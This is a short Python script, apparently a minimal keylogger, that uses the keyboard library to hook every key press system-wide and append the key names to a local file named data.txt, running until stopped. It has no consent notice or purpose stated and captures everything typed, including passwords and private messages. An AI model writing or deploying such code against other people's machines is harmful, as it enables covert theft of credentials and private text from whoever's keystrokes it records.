# pip install keyboard

import keyboard

def pressedKeys(key):
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        elif key.name == 'backspace':
            # Handle backspace if needed
            pass
        elif key.name == 'backslash':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressedKeys)
keyboard.wait()

